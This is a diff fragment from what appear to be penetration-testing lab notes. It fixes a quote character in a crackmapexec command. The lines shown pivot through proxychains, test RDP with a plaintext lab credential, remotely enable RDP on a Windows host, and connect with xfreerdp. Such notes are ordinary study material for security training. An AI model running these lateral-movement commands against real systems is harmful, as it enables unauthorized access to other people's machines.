@@ -142,7 +142,7 @@ Local admin access results in a (Pwn3d!) added after the login confirmation, sho
 
 rdp:
 proxychains4 -f /etc/proxychains4.conf crackmapexec rdp 172.16.218.82 -u 'yoshi' -p 'Mushroom!'
-proxychains4 -f /etc/proxychains4.conf crackmapexec smb 172.16.218.82 -u 'yoshi' -p 'Mushroom!' -M rdp -o ACTION='ENABLE’
+proxychains4 -f /etc/proxychains4.conf crackmapexec smb 172.16.218.82 -u 'yoshi' -p 'Mushroom!' -M rdp -o ACTION='ENABLE'
 proxychains4 -f /etc/proxychains4.conf xfreerdp /u:yoshi /d:medtech.com /p:Mushroom! /v:172.16.218.82 /cert-ignore
 
 smb:
